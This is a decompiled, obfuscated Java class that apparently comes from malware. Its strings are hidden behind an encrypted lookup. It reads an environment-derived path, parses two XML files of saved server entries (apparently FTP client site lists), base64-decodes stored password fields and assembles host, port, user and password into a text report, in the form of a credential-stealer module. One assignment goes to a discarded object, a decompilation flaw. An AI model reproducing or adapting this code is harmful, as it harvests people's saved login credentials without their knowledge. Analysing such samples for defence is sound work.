/*
 * Decompiled with CFR 0.152.
 */
package x;

import java.io.File;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Element;

public final class t {
    public static a a() {
        try {
            String string = System.getenv($S.d(212));
            if (string == null) {
                return null;
            }
            string = string + $S.d(455);
            a a2 = new a();
            t.a(string + $S.d(456), $S.d(457), a2.b);
            t.a(string + $S.d(458), $S.d(459), a2.b);
            if (a2.b.isEmpty()) {
                return null;
            }
            a2.a = true;
            return a2;
        }
        catch (Exception exception) {
            return null;
        }
    }

    private static void a(String object, String string, List<b> list2) {
        try {
            object = new File((String)object);
            if (!((File)object).exists()) {
                return;
            }
            Object object2 = DocumentBuilderFactory.newInstance();
            ((DocumentBuilderFactory)object2).setFeature($S.d(460), true);
            object2 = ((DocumentBuilderFactory)object2).newDocumentBuilder();
            object = ((DocumentBuilder)object2).parse((File)object);
            object = object.getElementsByTagName(string);
            for (int i2 = 0; i2 < object.getLength(); ++i2) {
                try {
                    object2 = (Element)object.item(i2);
                    b b2 = new b();
                    new b().a = t.a((Element)object2, $S.d(461));
                    b2.b = t.a((Element)object2, $S.d(462));
                    b2.c = t.a((Element)object2, $S.d(463));
                    object2 = object2.getElementsByTagName($S.d(464));
                    if (object2.getLength() > 0) {
                        object2 = (Element)object2.item(0);
                        String string2 = object2.getAttribute($S.d(465));
                        b2.d = object2.getTextContent();
                        if ($S.d(419).equalsIgnoreCase(string2) && b2.d != null && !b2.d.isEmpty()) {
                            try {
                                b2.d = new String(Base64.getDecoder().decode(b2.d.trim()), $S.d(399));
                            }
                            catch (Exception exception) {}
                        }
                    }
                    if (b2.a == null || b2.a.isEmpty()) continue;
                    list2.add(b2);
                    continue;
                }
                catch (Exception exception) {}
            }
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static String a(Element object, String string) {
        if ((object = object.getElementsByTagName(string)).getLength() > 0) {
            return object.item(0).getTextContent();
        }
        return "";
    }

    public static String a(List<b> object) {
        StringBuilder stringBuilder = new StringBuilder();
        object = object.iterator();
        while (object.hasNext()) {
            b b2 = (b)object.next();
            stringBuilder.append($S.d(466)).append(b2.a).append("\n");
            stringBuilder.append($S.d(467)).append(b2.b).append("\n");
            stringBuilder.append($S.d(468)).append(b2.c).append("\n");
            stringBuilder.append($S.d(469)).append(b2.d).append("\n");
            stringBuilder.append($S.d(104));
        }
        return stringBuilder.toString();
    }

    public static final class a {
        public boolean a;
        public List<b> b = new ArrayList<b>();
    }

    public static final class b {
        public String a;
        public String b;
        public String c;
        public String d;
    }
}

